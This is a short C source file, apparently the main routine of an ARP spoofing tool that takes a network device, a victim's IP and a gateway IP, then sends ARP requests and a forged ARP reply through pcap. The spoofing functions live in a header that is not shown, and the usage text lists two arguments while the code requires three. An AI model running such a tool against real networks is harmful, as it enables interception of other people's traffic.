#include <stdio.h>
#include <pcap.h>
#include <netinet/ether.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if_arp.h>
#include <string.h>
#include "send_arp.h"

int main(int argc, char *argv[])
{
	char *dev, errbuf[PCAP_ERRBUF_SIZE];
	pcap_t *handle;
	struct pcap_pkthdr header;
	const u_char *packet;
	struct network_pack a_g;
	struct network_pack a_v;
	//How to Use//
	printf("//////////How to use//////////\n");
	printf("agv[1] : DEVICE\n");
	printf("agv[2] : VICTIM'S IP ADDRESS\n");
	printf("EXAMPLE : ./getn ens33 192.168.0.1\n");

	if(argc != 4)
	{
		printf("ARGUMENT ERROR : YOU MUST RESTART...\n");
		return(2);
	}

	dev = argv[1];
	inet_aton(argv[2], &a_v.dst_ip);
	inet_aton(argv[3], &a_g.dst_ip);

	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL) {
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	
	printf("Device: %s\n\n", dev);

	get_network_info(dev, &a_g);
	arp_request(handle, &a_g);
	arp_request(handle, &a_v);
	send_arp(handle, &a_g, &a_v);
	
	return(0);
}
